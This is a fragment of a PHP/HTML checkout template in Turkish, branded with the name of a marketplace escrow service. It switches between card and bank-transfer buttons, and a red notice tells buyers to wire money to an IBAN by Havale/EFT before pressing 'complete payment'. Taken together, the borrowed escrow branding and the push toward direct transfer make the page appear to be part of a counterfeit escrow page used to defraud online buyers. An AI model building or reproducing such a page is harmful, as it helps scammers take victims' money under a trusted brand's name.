      ...
      <div class="set-payment-container set-payment-active-step-1">
        ...
        <form action="#" method="POST" autocomplete="off">
              ...
              <div class="set-payment-step-2-detail">
                ...
                <div class="right-box">
                  ...
                  <?php 
                    $type = $query['banks'];
                    if($type == 'creditcard') {
                      echo "<button id='makePaymentButton' class='btn btn-new make-payment-btn trackClick trackId_complete_purchase_v3 completeBtn2' type='submit'>Ödeme Adımına Geç</button>";
                    } else {
                      echo "<a href='#' id='proceedToPayment' class='btn btn-new go-to-payment-btn trackClick trackId_go_to_purchase_v3 purchaseBtn'>Ödeme Adımına Geç</a>";
                    }
                  ?>
                </div>
                <div class="responsive-part go-to-payment-btn-wrapper">
                  ...
                  <?php 
                    $type = $query['banks'];
                    if($type == 'creditcard') {
                      echo "<button class='btn btn-new make-payment-btn trackClick trackId_complete_purchase_v3 responsivePurchase' type='submit'>Ödeme Adımına Geç</button>";
                    } else {
                      echo "<a href='#' class='btn btn-new go-to-payment-btn trackClick trackId_go_to_purchase_v3 responsivePurchase'>Ödeme Adımına Geç</a>";
                    }
                  ?>
                </div>
              </div>
          ...
          <div class="sub-left-box credit-card-box">
            <div class="address-header">
              <h3>PARAM GÜVENDE İLE GÜVENLİ ÖDEME</h3>
            </div>
            <div id="creditCardPayment" class="paymentTypes">
              <div class="credit-card-form">
                <div class="left-column">
                  <h2 style="color:Red; font-size: small; font-weight: bold;">Aşağıdaki iban numarasına Havale/EFT (Haftasonları Fast ile Ödeme Yapınız!) Yoluyla ödeme yaptıktan sonra ödemeyi tamamla butonuna basınız. Ekibimiz gerekli kontrolü sağlayıp satıcıdan ürünün kargolanmasını talep edecektir.</h2>
                  <div class="box">
                    <div class="left">
                      <?php
                          if($query['banks'] != 'creditcard') {
